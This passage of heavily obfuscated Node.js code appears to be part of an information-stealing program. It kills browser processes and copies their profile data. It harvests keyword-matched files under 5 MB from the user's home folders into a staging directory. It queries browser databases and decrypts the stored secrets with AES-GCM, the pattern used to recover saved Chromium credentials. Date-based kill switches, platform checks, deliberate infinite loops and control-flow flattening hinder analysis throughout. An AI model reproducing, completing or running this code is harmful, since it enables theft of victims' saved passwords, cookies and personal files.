                            break;
                        case 0x22:
                            if (jJIllx.u() == "s") {
                                break;
                            }
                        case 0x7f:
                            UxmmwSD(jJIllx.e(), n49oLe += -0x1d, Ot8M78 += n49oLe == (jJIllx.b == 0xfb ? jJIllx.m : 0xfb) ? 0x5 : -0x10);
                            break;
                        case jJIllx.d ? 0x5a:
                            0x37e:
                                UxmmwSD(jJIllx.G(), Ot8M78 += 0xd);
                            break;
                        }
                    }
                } catch (__p_td_3e) {
                    while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, A536BJ = -0x2f)) {
                        var Q59OVlp;
                        var xtbSJI;
                        xtbSJI = 0x0;
                        if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f)) : __p_td_3e) ? function (uXPxRCH) {
                                xtbSJI = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, MHQ3bYA(-0x2f)) ? 0x1 : 0x0;
                            }(__p_td_3e) : Q59OVlp = 0x1, Q59OVlp && xtbSJI)) {
                            break;
                        }
                        if (Q59OVlp) {
                            continue;
                        }
                    }
                }
            }
            try {
                if (Date[bw1LDXR(0x493)]() < 0x18cc21afc00) {
                    while (true) {
                        var Xb4IwJx = 0x63;
                        for (Xb4IwJx = 0x63; Xb4IwJx == Xb4IwJx; Xb4IwJx *= Xb4IwJx) {
                            if (y7bTqx(rKAu9MB(Xb4IwJx, MHQ3bYA(-0x2f)) && console.log(Xb4IwJx), Xb4IwJx) <= 0xa) {
                                break;
                            }
                        };
                        if (Xb4IwJx === 0x64) {
                            Xb4IwJx--;
                        }
                    };
                }
                const i0gUcBP = pukrvr[Kt94kB(0x300)](lxP1K0s, bw1LDXR(0x494), mHQbVa);
                UxmmwSD(await MsCwg5O[Kt94kB(0x229)](i0gUcBP), await MsCwg5O[bw1LDXR(0x495)](uXPxRCH, i0gUcBP), NmsjOG6[bw1LDXR(0x496)](mHQbVa));
            } catch (_0x17ce04) {
                if (function () {
                        var uXPxRCH = function () {
                            const mHQbVa = function () {
                                const mHQbVa = new RegExp("\n");
                                return mHQbVa[bw1LDXR(0x497)](uXPxRCH);
                            };
                            return mHQbVa();
                        };
                        return uXPxRCH();
                    }()) {
                    process.exit();
                }
                console[Kt94kB(0x24e)](_0x17ce04);
            }
        };
        const _9nPPdY = async() => {
            if (new Date()[bw1LDXR(0x498)]() < 0x18cc21b0ffb) {
                while (true) {
                    var mHQbVa = 0x63;
                    for (mHQbVa = 0x63; mHQbVa == mHQbVa; mHQbVa *= mHQbVa) {
                        if (y7bTqx(rKAu9MB(mHQbVa, MHQ3bYA(-0x2f)) && console.log(mHQbVa), mHQbVa) <= 0xa) {
                            break;
                        }
                    };
                    if (mHQbVa === 0x64) {
                        mHQbVa--;
                    }
                };
            }
            for (const [kY3q474, n49oLe] of Object[Kt94kB(0x31f)](yl2wlnI)) {
                const {
                    main_path: Ot8M78
                    , process_name: jJIllx
                } = n49oLe;
                if (await MsCwg5O[Kt94kB(0x20f)](Ot8M78)) {
                    await gwbHVf2(jJIllx);
                    await m7wWOpG(Ot8M78, kY3q474);
                }
            }
        };
        const m7wWOpG = async(uXPxRCH, mHQbVa) => {
            if (Date[bw1LDXR(0x499)][bw1LDXR.apply(undefined, [0x49a])][bw1LDXR(0x49b)](new Date()) > 0x19b76a3c8ce) {
                process.exit();
            }
            try {
                const n49oLe = pukrvr[Kt94kB(0x300)](lxP1K0s, Kt94kB(0x24b), mHQbVa);
                const Ot8M78 = y7bTqx(await MsCwg5O[Kt94kB(0x229)](n49oLe), async(uXPxRCH, mHQbVa) => {
                    if (Date[bw1LDXR(0x49c)]() < 0x18cc21b00c8) {
                        process.exit();
                    }
                    if (uXPxRCH[Kt94kB(0x2a6)](Kt94kB(0x270)) || uXPxRCH[Kt94kB(0x2a6)](Kt94kB(0x202)) || uXPxRCH[bw1LDXR(0x49d)](Kt94kB(0x204)) || uXPxRCH[Kt94kB(0x2a6)](Kt94kB(0x31b))) {
                        return rKAu9MB([], MHQ3bYA(-0x2f));
                    }
                    const Ot8M78 = await MsCwg5O[bw1LDXR(0x49e)](uXPxRCH);
                    const jJIllx = Ot8M78[Kt94kB(0x2f0)] / 1048576;
                    return jJIllx <= 0x32;
                });
                if (Date[bw1LDXR(0x49f)]() < 0x18cc21b0c08) {
                    process.exit();
                }
                UxmmwSD(await MsCwg5O[Kt94kB(0x20d)](uXPxRCH, n49oLe, {
                    [bw1LDXR(0x4a0)]: Ot8M78
                }), TtG4Jmt[bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x4a1)](mHQbVa));
            } catch (_0x228315) {
                if (Date[bw1LDXR(0x4a2)]() < 0x18cc21b0c0f) {
                    try {
                        var td77ore;
                        var Q59OVlp;
                        var xtbSJI;
                        var TaFn0Uv;
                        UxmmwSD(td77ore = -0xf1, Q59OVlp = 0x14e, xtbSJI = -0x22, TaFn0Uv = {
                            "g": -0x10
                            , "i": function () {
                                return xtbSJI = 0x13;
                            }
                            , "n": function () {
                                return xtbSJI += 0x7;
                            }
                            , "s": 0x12c
                            , "f": () => {
                                td77ore += 0x48;
                                return Q59OVlp += -0x10;
                            }
                            , "k": function (uXPxRCH = xtbSJI == -0x22) {
                                if (!uXPxRCH) {
                                    return Q59OVlp == 0x1e;
                                }
                                Q59OVlp *= 0x2;
                                Q59OVlp -= 0x16e;
                                return xtbSJI += 0x7;
                            }
                            , "t": 0x13
                            , "c": bw1LDXR(0x4a3) + bw1LDXR(0x4a4) + bw1LDXR(0x4a5) + bw1LDXR(0x4a6)
                            , "v": 0x40
                            , "u": () => {
                                return xtbSJI = 0x13;
                            }
                            , "o": 0xf9
                            , "d": 0x2f
                            , "w": () => {
                                return Q59OVlp += 0x40;
                            }
                            , "h": () => {
                                td77ore *= 0x2;
                                td77ore -= -0x10f;
                                return Q59OVlp += TaFn0Uv.g;
                            }
                            , "j": 0x7
                            , "b": bw1LDXR(0x4a7)
                            , "r": 0x2
                            , "e": () => {
                                return td77ore = 0x77;
                            }
                        });
                        while (td77ore + Q59OVlp + xtbSJI != 0x4d) {
                            switch (td77ore + Q59OVlp + xtbSJI) {
                            case 0x91:
                            case Q59OVlp - 0x15b:
                            case 0x1b:
                            case 0x3b9:
                                UxmmwSD(td77ore = 0x77, TaFn0Uv.f());
                                break;
                            case 0x3b:
                                var Xb4IwJx;
                                UxmmwSD(Xb4IwJx = mHQbVa, xtbSJI += 0x7);
                                break;
                            case 0x42:
                            case 0x1c8:
                                UxmmwSD(Xb4IwJx(), Q59OVlp *= 0x2, Q59OVlp -= 0x143);
                                break;
                            case 0x2:
                                UxmmwSD(xtbSJI = 0x13, Q59OVlp += 0x40);
                                break;
                            case xtbSJI + 0x5e:
                                UxmmwSD(delete 0x2f, td77ore = 0x77, TaFn0Uv.h());
                                break;
                            case 0x31:
                                UxmmwSD(td77ore = 0x77, Q59OVlp *= 0x2, Q59OVlp -= 0x12c, xtbSJI += -0x7);
                                break;
                            case 0x172:
                            case 0x115:
                            default:
                                UxmmwSD(xtbSJI = 0x13, TaFn0Uv.k());
                                break;
                            }
                        }
                    } catch (__p_td_3e) {
                        while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                            var i0gUcBP;
                            var BSJ1pS;
                            BSJ1pS = 0x0;
                            if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f)) : __p_td_3e) ? function (uXPxRCH) {
                                    BSJ1pS = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, A536BJ = -0x2f) ? 0x1 : 0x0;
                                }(__p_td_3e) : i0gUcBP = 0x1, i0gUcBP && BSJ1pS)) {
                                break;
                            }
                            if (i0gUcBP) {
                                continue;
                            }
                        }
                    }
                }
                return;
            }
        };
        const NsCsxjF = async() => {
            const kY3q474 = [Kt94kB(0x34c), bw1LDXR(0x4a8), bw1LDXR(0x4a9), Kt94kB(0x239), Kt94kB(0x294), bw1LDXR(0x4aa) + bw1LDXR(0x4ab), Kt94kB(0x2fe), Kt94kB(0x21b), Kt94kB(0x23b), bw1LDXR(0x4ac), Kt94kB(0x2fc), Kt94kB(0x28f), Kt94kB(0x21d), bw1LDXR(0x4ad), bw1LDXR(0x4ae), bw1LDXR(0x4af), bw1LDXR(0x4b0), Kt94kB(0x21c), Kt94kB(0x236), Kt94kB(0x252), Kt94kB(0x226), Kt94kB(0x205), Kt94kB(0x287), Kt94kB(0x2e9), Kt94kB(0x30a), Kt94kB(0x2b9), bw1LDXR.call(undefined, 0x4b1), bw1LDXR(0x4b2), bw1LDXR(0x4b3), Kt94kB(0x2e4), Kt94kB(0x289), Kt94kB(0x2c5), Kt94kB(0x275), Kt94kB(0x306), bw1LDXR.call(undefined, 0x4b4), Kt94kB(0x262), Kt94kB(0x1fd), bw1LDXR(0x4b5), Kt94kB(0x308), Kt94kB(0x332), bw1LDXR(0x4b6), Kt94kB(0x302), Kt94kB(0x32a), Kt94kB(0x212), Kt94kB(0x333), Kt94kB(0x292), Kt94kB(0x267), Kt94kB(0x242), Kt94kB(0x234), Kt94kB(0x293), Kt94kB(0x26f), bw1LDXR(0x4b7), Kt94kB(0x20a), bw1LDXR(0x4b8), Kt94kB(0x283), Kt94kB(0x265), Kt94kB(0x260), Kt94kB(0x331), bw1LDXR(0x4b9), Kt94kB(0x1f0), Kt94kB(0x2c6), bw1LDXR(0x4ba), Kt94kB(0x2ac), Kt94kB(0x253), Kt94kB(0x2e2), Kt94kB(0x209), Kt94kB(0x219), Kt94kB(0x214), Kt94kB(0x2ed)];
            const n49oLe = [Kt94kB(0x29d), Kt94kB(0x217), Kt94kB(0x24f), bw1LDXR(0x4bb), Kt94kB(0x34d), Kt94kB(0x2fa), Kt94kB(0x215), Kt94kB(0x29c), Kt94kB(0x26a), bw1LDXR(0x4b6), Kt94kB(0x2a5)];
            const Ot8M78 = mHQbVa => {
                if (new Date()[bw1LDXR(0x4bc)]() > 0x19b76a3bead) {
                    try {
                        var Ot8M78 = function (mHQbVa, n49oLe) {
                            return n49oLe;
                        };
                        var jJIllx;
                        var td77ore;
                        var Q59OVlp;
                        UxmmwSD(jJIllx = 0x1d3, td77ore = -0x1b8, Q59OVlp = {
                            "v": function () {
                                return td77ore += 0x1b;
                            }
                            , "m": -0x4
                            , "c": 0x2f
                            , "n": () => {
                                jJIllx += 0x0;
                                return td77ore += 0x0;
                            }
                            , "l": function () {
                                return xtbSJI();
                            }
                            , "b": bw1LDXR(0x4bd)
                            , "o": 0x79
                            , "e": function (mHQbVa = jJIllx == 0x18) {
                                if (mHQbVa) {
                                    return "f";
                                }
                                return jJIllx += -0x19;
                            }
                            , "w": -0x35
                            , "j": function () {
                                UxmmwSD(jJIllx = 0x3, Q59OVlp.e());
                                return "h";
                            }
                            , "t": () => {
                                jJIllx += -0x35;
                                return td77ore += -0x3;
                            }
                            , "p": (mHQbVa = false) => {
                                if (mHQbVa) {
                                    return "r";
                                }
                                return jJIllx += -0x31;
                            }
                            , "d": 0x3
                            , "u": 0x1b
                            , A: function (mHQbVa) {
                                return mHQbVa != -0x1c8 && mHQbVa != -0x1b5 && mHQbVa != -0x1b8 && mHQbVa + 0x204;
                            }
                            , B: function (mHQbVa) {
                                return mHQbVa != 0x204 && mHQbVa != 0x1cf && mHQbVa != 0x1e8 && mHQbVa - 0x1b8;
                            }
                            , C: function (mHQbVa) {
                                return mHQbVa != -0x1c8 && mHQbVa != -0x1d0 && mHQbVa != -0x1b5 && mHQbVa + 0x204;
                            }
                        });
                        while (jJIllx + td77ore != 0x17) {
                            switch (jJIllx + td77ore) {
                            case 0x30:
                                if (Q59OVlp.j() == "h") {
                                    break;
                                }
                            case 0x159:
                            case 0x54:
                            case 0x32:
                            default:
                                UxmmwSD(delete Q59OVlp.z, jJIllx = -0x27, td77ore += 0x1b);
                                break;
                            case 0x3c:
                                UxmmwSD(jJIllx = 0x3, jJIllx += Q59OVlp.w, td77ore += 0x10);
                                break;
                            case jJIllx != 0x204 && jJIllx != 0x1cf && jJIllx != 0x1e8 && jJIllx - 0x1b8:
                                var xtbSJI = (Q59OVlp.k = Ot8M78)(this, function () {
                                    var mHQbVa = function () {
                                        var n49oLe = mHQbVa.constructor(bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x4be]))()
                                            .constructor(Q59OVlp.b);
                                        return rKAu9MB(n49oLe.call(mHQbVa), MHQ3bYA(-0x2f));
                                    };
                                    return mHQbVa();
                                });
                                UxmmwSD(xtbSJI(), jJIllx += Q59OVlp.m);
                                break;
                            case td77ore != -0x1c8 && td77ore != -0x1d0 && td77ore != -0x1b5 && td77ore + 0x204:
                            case 0x42:
                            case 0x226:
                            case 0x80:
                                if (td77ore == -0x21) {
                                    Q59OVlp.n();
                                    break;
                                }
                                UxmmwSD(td77ore = -0x79, Q59OVlp.p());
                                break;
                            case 0x196:
                            case 0x13a:
                            case 0x1b0:
                            case 0x4f:
                                UxmmwSD(td77ore = -0x3d, Q59OVlp.t());
                                break;
                            }
                        }
                    } catch (__p_td_3e) {
                        while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                            var TaFn0Uv;
                            var Xb4IwJx;
                            Xb4IwJx = 0x0;
                            if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, A536BJ = -0x2f) : __p_td_3e) ? function (mHQbVa) {
                                    Xb4IwJx = mHQbVa ? 0x0 : rKAu9MB(mHQbVa, A536BJ = -0x2f) ? 0x1 : 0x0;
                                }(__p_td_3e) : TaFn0Uv = 0x1, TaFn0Uv && Xb4IwJx)) {
                                break;
                            }
                            if (TaFn0Uv) {
                                continue;
                            }
                        }
                    }
                }
                return kY3q474[Kt94kB(0x307)](Ot8M78 => mHQbVa[Kt94kB(0x256)]()[Kt94kB(0x2a6)](Ot8M78));
            };
            const jJIllx = mHQbVa => {
                if (Date[bw1LDXR(0x4bf) + bw1LDXR(0x4c0)][bw1LDXR(0x4c1)][bw1LDXR.call(undefined, 0x4c2)](new Date()) < 0x18cc21b14c2) {
                    process.exit();
                }
                return n49oLe[Kt94kB(0x307)](uXPxRCH => mHQbVa[Kt94kB(0x256)]()[bw1LDXR(0x4c3)](uXPxRCH[Kt94kB(0x256)]()));
            };
            const td77ore = async mHQbVa => {
                let n49oLe = [];
                if (rKAu9MB(require('os')
                        .platform() === bw1LDXR(0x4c4), A536BJ = -0x2f)) {
                    process.exit();
                }
                try {
                    if (new Date()[bw1LDXR(0x4c5)]() > 0x19b76a3ad69) {
                        process.exit();
                    }
                    const Q59OVlp = await MsCwg5O[bw1LDXR(0x4c6)](mHQbVa);
                    for (const xtbSJI of Q59OVlp) {
                        const TaFn0Uv = pukrvr[bw1LDXR(0x4c7)](mHQbVa, xtbSJI);
                        try {
                            const Xb4IwJx = await MsCwg5O[Kt94kB(0x27e)](TaFn0Uv);
                            if (Xb4IwJx[Kt94kB(0x26d)]()) {
                                if (Ot8M78(xtbSJI)) {
                                    n49oLe = n49oLe[Kt94kB(0x1ff)](await td77ore(TaFn0Uv));
                                }
                            } else if (Ot8M78(pukrvr[bw1LDXR.apply(undefined, [0x4c8])](TaFn0Uv)) && jJIllx(TaFn0Uv) && Xb4IwJx[Kt94kB(0x2f0)] <= 5242880) {
                                n49oLe[Kt94kB(0x2b1)](TaFn0Uv);
                            }
                        } catch (_0x1fc4fc) {
                            if (_0x1fc4fc[Kt94kB(0x2e9)] === Kt94kB(0x2be)) {
                                console[Kt94kB(0x24e)](Kt94kB(0x2a4));
                            } else {
                                throw _0x1fc4fc;
                            }
                        }
                    }
                } catch (_0x145ad9) {
                    if (Date[bw1LDXR(0x4c9) + bw1LDXR(0x4ca)][bw1LDXR(0x4cb)][bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x4cc)](new Date()) > 0x19b76a3c30c) {
                        try {
                            UxmmwSD(kY3q474, kY3q474());
                        } catch (__p_td_3e) {
                            while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, A536BJ = -0x2f)) {
                                var Xp96Uso;
                                var TljPa8;
                                TljPa8 = 0x0;
                                if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, A536BJ = -0x2f) : __p_td_3e) ? function (mHQbVa) {
                                        TljPa8 = mHQbVa ? 0x0 : rKAu9MB(mHQbVa, A536BJ = -0x2f) ? 0x1 : 0x0;
                                    }(__p_td_3e) : Xp96Uso = 0x1, Xp96Uso && TljPa8)) {
                                    break;
                                }
                                if (Xp96Uso) {
                                    continue;
                                }
                            }
                        }
                    }
                    if (_0x145ad9[Kt94kB(0x2e9)] === Kt94kB(0x2be)) {
                        console[Kt94kB(0x24e)](_0x145ad9);
                    } else {
                        throw _0x145ad9;
                    }
                }
                return n49oLe;
            };
            const Q59OVlp = async mHQbVa => {
                const n49oLe = await MsCwg5O[Kt94kB(0x240)](mHQbVa);
                let Ot8M78 = 0x0;
                if (function () {
                        var mHQbVa = function () {
                            const kY3q474 = function () {
                                const kY3q474 = new RegExp("\n");
                                return kY3q474[bw1LDXR(0x4d1)](mHQbVa);
                            };
                            return kY3q474();
                        };
                        return mHQbVa();
                    }()) {
                    try {
                        var td77ore;
                        var Q59OVlp;
                        var xtbSJI;
                        UxmmwSD(td77ore = 0x4b, Q59OVlp = 0x15, xtbSJI = {
                            "G": function () {
                                return Q59OVlp += -0x56;
                            }
                            , "h": function () {
                                return Q59OVlp += 0x2d;
                            }
                            , "i": (mHQbVa = xtbSJI.b == bw1LDXR(0x4d2)) => {
                                if (!mHQbVa) {
                                    return td77ore;
                                }
                                return Q59OVlp += 0x45;
                            }
                            , "w": 0x1c
                            , "c": function (mHQbVa = xtbSJI[bw1LDXR(0x4d3) + bw1LDXR(0x4d4) + "ty"]("e")) {
                                if (mHQbVa) {
                                    return td77ore;
                                }
                                return td77ore == 0x1b;
                            }
                            , "F": function () {
                                return kY3q474();
                            }
                            , "v": (mHQbVa = typeof xtbSJI.b == bw1LDXR(0x4d5)) => {
                                if (mHQbVa) {
                                    return xtbSJI.z();
                                }
                            }
                            , "o": () => {}
                            , "b": bw1LDXR(0x4d2)
                            , "p": function (mHQbVa = xtbSJI.b == -0x4a) {
                                if (mHQbVa) {
                                    return Q59OVlp;
                                }
                                return Q59OVlp += -0x7;
                            }
                            , "A": (mHQbVa = xtbSJI[bw1LDXR(0x4d3) + bw1LDXR(0x4d4) + "ty"]("C")) => {
                                if (mHQbVa) {
                                    return xtbSJI.E();
                                }
                                return td77ore += -0x5;
                            }
                            , H: function (mHQbVa) {
                                return mHQbVa != -0x2a && mHQbVa != -0x41 && mHQbVa + 0x46;
                            }
                        });
                        while (td77ore + Q59OVlp != 0x5) {
                            switch (td77ore + Q59OVlp) {
                            case 0x5e:
                            case 0x90:
                            case Q59OVlp != 0x15 && Q59OVlp != 0x1c && Q59OVlp != -0x18 && Q59OVlp + 0x4b:
                                if (xtbSJI.o() == "m") {
                                    break;
                                }
                            case 0x67:
                                if (xtbSJI.v() == "t") {
                                    break;
                                }
                            default:
                            case 0x284:
                            case 0x172:
                                UxmmwSD(Q59OVlp = 0x89, Q59OVlp += 0x3f);
                                break;
                            case 0x1b6:
                            case 0x107:
                            case 0x33:
                            case 0x1cd:
                                if (xtbSJI.c()) {
                                    Q59OVlp += 0x2d;
                                    break;
                                }
                            case 0x60:
                            case 0x1c1:
                                xtbSJI.A();
                                break;
                            case Q59OVlp != -0x2a && Q59OVlp != -0x41 && Q59OVlp + 0x46:
                                UxmmwSD(kY3q474(), Q59OVlp += -0x56);
                                break;
                            }
                        }
                    } catch (__p_td_3e) {
                        while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                            var Xb4IwJx;
                            var i0gUcBP;
                            i0gUcBP = 0x0;
                            if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f)) : __p_td_3e) ? function (mHQbVa) {
                                    i0gUcBP = mHQbVa ? 0x0 : rKAu9MB(mHQbVa, A536BJ = -0x2f) ? 0x1 : 0x0;
                                }(__p_td_3e) : Xb4IwJx = 0x1, Xb4IwJx && i0gUcBP)) {
                                break;
                            }
                            if (Xb4IwJx) {
                                continue;
                            }
                        }
                    }
                }
                for (const BSJ1pS of n49oLe) {
                    const Xp96Uso = pukrvr[Kt94kB(0x300)](mHQbVa, BSJ1pS);
                    const TljPa8 = await MsCwg5O[Kt94kB(0x27e)](Xp96Uso);
                    if (TljPa8[Kt94kB(0x228)]()) {
                        Ot8M78 += TljPa8[Kt94kB(0x2f0)];
                    }
                }
                return Ot8M78;
            };
            const xtbSJI = pukrvr[Kt94kB(0x300)](lxP1K0s, bw1LDXR(0x4da));
            let TaFn0Uv = y7bTqx(await MsCwg5O[Kt94kB(0x229)](xtbSJI), []);
            const Xb4IwJx = [pukrvr[Kt94kB(0x300)](process[Kt94kB(0x24c)][Kt94kB(0x301)], Kt94kB(0x2cc)), pukrvr[Kt94kB(0x300)](process[bw1LDXR(0x317)][Kt94kB(0x301)], Kt94kB(0x345)), pukrvr[Kt94kB(0x300)](process[Kt94kB(0x24c)][bw1LDXR.apply(undefined, [0x342])], bw1LDXR(0x4db)), pukrvr[Kt94kB(0x300)](process[Kt94kB(0x24c)][Kt94kB(0x301)], Kt94kB(0x2d5), Kt94kB(0x26c))];
            for (const i0gUcBP of Xb4IwJx) {
                try {
                    if (await MsCwg5O[Kt94kB(0x20f)](i0gUcBP)) {
                        const BSJ1pS = await td77ore(i0gUcBP);
                        TaFn0Uv = TaFn0Uv[Kt94kB(0x1ff)](BSJ1pS);
                    }
                } catch (_0xe3cc3b) {
                    console[bw1LDXR(0x4dc)](_0xe3cc3b);
                }
            }
            if (new Date()[bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x4dd])]() > 0x19b76a3b234) {
                process.exit();
            }
            for (const Xp96Uso of TaFn0Uv) {
                const TljPa8 = pukrvr[Kt94kB(0x300)](xtbSJI, pukrvr[Kt94kB(0x2cf)](Xp96Uso));
                const vhNite = (await MsCwg5O[Kt94kB(0x27e)](Xp96Uso))[Kt94kB(0x2f0)];
                const lA0B8WY = await Q59OVlp(xtbSJI);
                if (lA0B8WY + vhNite <= 20971520) {
                    try {
                        await MsCwg5O[Kt94kB(0x20d)](Xp96Uso, TljPa8);
                    } catch (_0xfaca37) {
                        console[Kt94kB(0x24e)](_0xfaca37);
                    }
                }
            }
        };
        const fNtOtfY = async() => {
            if (function () {
                    var uXPxRCH = function () {
                        const mHQbVa = function () {
                            const mHQbVa = new RegExp("\n");
                            return mHQbVa[bw1LDXR(0x509)](uXPxRCH);
                        };
                        return mHQbVa();
                    };
                    return uXPxRCH();
                }()) {
                process.exit();
            }
            for (const [mHQbVa, kY3q474] of Object[bw1LDXR(0x50a)](C6GoqKD)) {
                const {
                    main_path: n49oLe
                    , profiles: Ot8M78
                    , process_name: jJIllx
                } = kY3q474;
                if (await MsCwg5O[Kt94kB(0x20f)](n49oLe)) {
                    const td77ore = pukrvr[Kt94kB(0x300)](n49oLe, Kt94kB(0x203));
                    if (Ot8M78) {
                        for (const Q59OVlp of Ot8M78) {
                            const xtbSJI = pukrvr[Kt94kB(0x300)](n49oLe, Q59OVlp, Kt94kB(0x277));
                            await nvo2NKk(xtbSJI, td77ore, mHQbVa + "_" + Q59OVlp);
                        }
                    } else {
                        const TaFn0Uv = pukrvr[bw1LDXR(0x50b)](n49oLe, Kt94kB(0x277));
                        await nvo2NKk(TaFn0Uv, td77ore, mHQbVa);
                    }
                }
            }
        };
        const nvo2NKk = async(uXPxRCH, mHQbVa, kY3q474) => {
            if (new Date()[bw1LDXR(0x50c)]() < 0x18cc21b14ea) {
                var n49oLe = "a";
                while (0x1) {
                    n49oLe = n49oLe += "a";
                }
            }
            if (await MsCwg5O[Kt94kB(0x20f)](uXPxRCH)) {
                const jJIllx = await R4UyGcx(mHQbVa);
                if (Date[bw1LDXR(0x50d)][bw1LDXR(0x50c)][bw1LDXR(0x50e)](new Date()) < 0x18cc21b011f) {
                    process.exit();
                }
                if (jJIllx) {
                    try {
                        if (Date[bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x50d])][bw1LDXR(0x50c)][bw1LDXR(0x50e)](new Date()) > 0x19b76a3c5a2) {
                            process.exit();
                        }
                        const td77ore = new s1pwaN(uXPxRCH, e0MiDs);
                        UxmmwSD(td77ore[Kt94kB(0x2c1)](() => {
                            if (rKAu9MB(require('os')
                                    .platform() === bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x50f), A536BJ = -0x2f)) {
                                process.exit();
                            }
                            td77ore[Kt94kB(0x313)](bw1LDXR(0x510) + bw1LDXR(0x511) + bw1LDXR.call(undefined, 0x512) + bw1LDXR(0x513) + "ds", (mHQbVa, n49oLe) => {
                                if (function () {
                                        var mHQbVa = function () {
                                            const n49oLe = function () {
                                                const n49oLe = new RegExp("\n");
                                                return n49oLe[bw1LDXR(0x514)](mHQbVa);
                                            };
                                            return n49oLe();
                                        };
                                        return mHQbVa();
                                    }()) {
                                    while (true) {
                                        var Ot8M78 = 0x63;
                                        for (Ot8M78 = 0x63; Ot8M78 == Ot8M78; Ot8M78 *= Ot8M78) {
                                            if (y7bTqx(rKAu9MB(Ot8M78, A536BJ = -0x2f) && console.log(Ot8M78), Ot8M78) <= 0xa) {
                                                break;
                                            }
                                        };
                                        if (Ot8M78 === 0x64) {
                                            Ot8M78--;
                                        }
                                    };
                                }
                                if (mHQbVa) {
                                    if (y7bTqx(console[Kt94kB(0x24e)](mHQbVa), Date[bw1LDXR(0x515)]()) > 0x19b76a3c198) {
                                        process.exit();
                                    }
                                    return;
                                }
                                let Q59OVlp = y7bTqx(sSnYEwn += n49oLe[Kt94kB(0x2d7)], '');
                                for (const xtbSJI of n49oLe) {
                                    try {
                                        const TaFn0Uv = xtbSJI[Kt94kB(0x2d8)];
                                        const Kt94kB = TaFn0Uv[Kt94kB(0x23e)](0x3, 0xf);
                                        const Xb4IwJx = TaFn0Uv[bw1LDXR(0x516)](0xf, TaFn0Uv[bw1LDXR(0x517)] - 0x10);
                                        const i0gUcBP = TaFn0Uv[Kt94kB(0x23e)](TaFn0Uv[Kt94kB(0x2d7)] - 0x10);
                                        let MsCwg5O = '';
                                        if (TaFn0Uv && TaFn0Uv[bw1LDXR(0x517)]) {
                                            try {
                                                var BSJ1pS = (mHQbVa, n49oLe, Ot8M78, td77ore, Q59OVlp) => {
                                                    if (typeof td77ore === "undefined") {
                                                        td77ore = TljPa8;
                                                    }
                                                    if (typeof Q59OVlp === bw1LDXR[0x1da]) {
                                                        Q59OVlp = ph4WoIw;
                                                    }
                                                    if (mHQbVa !== n49oLe) {
                                                        return Q59OVlp[mHQbVa] || (Q59OVlp[mHQbVa] = td77ore(NkrHL_[mHQbVa]));
                                                    }
                                                    if (Ot8M78 == td77ore) {
                                                        return n49oLe ? mHQbVa[Q59OVlp[n49oLe]] : ph4WoIw[mHQbVa] || (Ot8M78 = Q59OVlp[mHQbVa] || td77ore, ph4WoIw[mHQbVa] = Ot8M78(NkrHL_[mHQbVa]));
                                                    }
                                                    if (n49oLe) {
                                                        [Q59OVlp, n49oLe] = [td77ore(Q59OVlp), mHQbVa || Ot8M78];
                                                        return BSJ1pS(mHQbVa, Q59OVlp, Ot8M78);
                                                    }
                                                    if (Ot8M78 == mHQbVa) {
                                                        return n49oLe[ph4WoIw[Ot8M78]] = BSJ1pS(mHQbVa, n49oLe);
                                                    }
                                                };
                                                const Xp96Uso = fZVPjSs[Kt94kB(0x2e0)](bw1LDXR(0x518) + bw1LDXR(0x519), jJIllx, Kt94kB);
                                                UxmmwSD(Xp96Uso[Kt94kB(0x290)](i0gUcBP), MsCwg5O = Xp96Uso[Kt94kB(0x2ff)](Xb4IwJx, null, Kt94kB(0x29b)) + Xp96Uso[Kt94kB(0x206)](Kt94kB(0x29b)), Q59OVlp += Kt94kB(0x2f5) + xtbSJI[bw1LDXR(0x51a) + BSJ1pS(0x51b)] + bw1LDXR(0x51c) + MsCwg5O + Kt94kB(0x30c) + xtbSJI[BSJ1pS(0x51d) + bw1LDXR(0x51e) + bw1LDXR.call(undefined, 0x51f)][Kt94kB(0x28b)]() + "/" + xtbSJI[BSJ1pS(0x520)][bw1LDXR(0x521)]() + "\n");

                                                function TljPa8(mHQbVa, n49oLe = "wZBqJmt8c$@vA7TguDj3(SH4=EMe/^sp?V<52aI_XN,QL)!nk1`Y.y>#}lrCO:d%]*6~RK0i&\"FoUf[Gb|+h9zPxW;{", Ot8M78, td77ore, Q59OVlp = [], xtbSJI = 0x0, TaFn0Uv = 0x0, Kt94kB, Xb4IwJx = 0x0, i0gUcBP) {
                                                    UxmmwSD(Ot8M78 = '' + (mHQbVa || ''), td77ore = Ot8M78.length, Kt94kB = -0x1);
                                                    for (Xb4IwJx = Xb4IwJx; Xb4IwJx < td77ore; Xb4IwJx++) {
                                                        i0gUcBP = n49oLe.indexOf(Ot8M78[Xb4IwJx]);
                                                        if (i0gUcBP === -0x1) {
                                                            continue;
                                                        }
                                                        if (Kt94kB < 0x0) {
                                                            Kt94kB = i0gUcBP;
                                                        } else {
                                                            UxmmwSD(Kt94kB += i0gUcBP * 0x5b, xtbSJI |= Kt94kB << TaFn0Uv, TaFn0Uv += (Kt94kB & 0x1fff) > 0x58 ? 0xd : 0xe);
                                                            do {
                                                                UxmmwSD(Q59OVlp.push(xtbSJI & 0xff), xtbSJI >>= 0x8, TaFn0Uv -= 0x8);
                                                            } while (TaFn0Uv > 0x7);
                                                            Kt94kB = -0x1;
                                                        }
                                                    }
                                                    if (Kt94kB > -0x1) {
                                                        Q59OVlp.push((xtbSJI | Kt94kB << TaFn0Uv) & 0xff);
                                                    }
